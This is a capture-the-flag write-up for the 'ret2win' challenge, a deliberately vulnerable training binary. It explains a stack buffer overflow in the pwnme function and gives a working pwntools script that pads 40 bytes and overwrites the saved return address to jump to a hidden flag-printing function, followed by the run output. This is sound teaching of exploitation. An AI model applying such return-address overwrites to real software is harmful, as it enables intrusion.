# ret2win

A simple exploit involving overflowing a buffer and overwriting the saved `rip` value.

There are two main functions in this program, `main` and `pwnme`. Obviously we need to exploit the latter.

Looking at the decompiled code of `pwnme` in Cutter:

```c
void pwnme(void)
{
    void *buf; // sub rsp, 0x20
    
    memset(&buf, 0, 0x20); 
    puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
    puts("What could possibly go wrong?");
    puts("You there, may I have your input please? And don\'t worry about null bytes, we\'re using read()!\n");
    printf(0x400918);
    read(0, &buf, 0x38);
    puts("Thank you!");
    return;
}
```

This allocates 0x20 bytes of stack space, but reads in 0x38 bytes. Which means we can overflow this buffer and write into the saved instruction pointer further down on the stack. So, when the function `ret`s and pops `rip`, it won't jump back to `main`, but rather somewhere else. But where?

Turns out, there's a secret function that was never called. Looking at the symbol table, we find something rather interesting:

```text
sym.main
sym.pwnme
sym.register_tm_clones
sym.ret2win
```

That ret2win looks very suspicious. I wonder what it contains.

```c
void ret2win(void)
{
    puts("Well done! Here\'s your flag:");
    system("/bin/cat flag.txt");
    return;
}
```

...oh. Well, our life just got a whole lot easier.

Great. Now that we know where to jump to, let's figure out how to get there.

So, at the call to `read()`, the stack looks like this:

```text
Each line represents 8 bytes.
------------------------

[buf_3    ] <- rsp ¯¯| (read() starts writing here and goes down)
[buf_2    ]          |
[buf_1    ]          |-Total 32 bytes
[buf_0    ] <- rbp __|
[saved rbp]
[saved rip]

------------------------
```

What we want to do is to overflow `buf` and write into the saved `rip` memory region the address of `ret2win`, which we can easily find with any disassembler.

We can just write a simple exploit script with `pwntools` like so:

```python
# The "kitchen sink" approach.
from pwn import *

# set the instruction set arch we're working with.
# since we're just sending in bytes, it's not important,
# but it's good practice to do it.
context.arch = "amd64"

# spawn the process. in a normal CTF, we'd use remote().
conn = process("./ret2win")

# receive bytes until we're prompted for input
conn.recvuntil(b"> ")

# construct our exploit string.
# 40 bytes of random data (by convention 0x41 'A' just cause)
# and the address of ret2win, packed to 64 bytes little-endian.
# we can easily do this with a convenience function provided by pwntools.
exp = b"A" * 40 + p64(0x400756)

# send the string.
conn.send(exp)

# we're not popping a shell, just reading a flag, so receive the bytes
# outputted by the program and print them to the screen.
print(conn.recvall())
```

Cool. Now all we gotta do is run it.

```text
$ python exploit.py

[+] Starting local process './ret2win': pid 170197
[+] Receiving all data: Done (73B)
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 170197)
b"Thank you!\nWell done! Here's your flag:\nROPE{a_placeholder_32byte_flag!}\n"
```
